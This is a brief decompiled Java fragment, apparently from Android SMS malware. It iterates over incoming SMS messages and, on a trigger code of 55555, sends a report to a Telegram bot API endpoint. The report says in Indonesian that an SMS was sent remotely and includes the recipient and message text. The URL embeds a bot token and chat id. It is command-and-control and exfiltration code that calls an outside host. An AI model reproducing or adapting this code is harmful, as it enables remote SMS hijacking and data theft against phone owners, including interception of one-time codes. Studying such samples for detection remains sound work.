                    ...
                    while (i < smsMessageArr.length) {
                        ...
                        if (parseInt == 55555) {
                            ...
                            try {
                                String str9 = str6;
                                String str10 = str9;
                                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7063902404:AAEE6TJqVfohmlkeUHbrByKVRuF8RDFcSzE/sendMessage?parse_mode=markdown&chat_id=7080400074&text=Berhasil Kirim SMS dari Jauh  %0AKepada  : _" + str5 + "_,%0A𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : _" + str9 + "_").build()).enqueue(new Callback() {
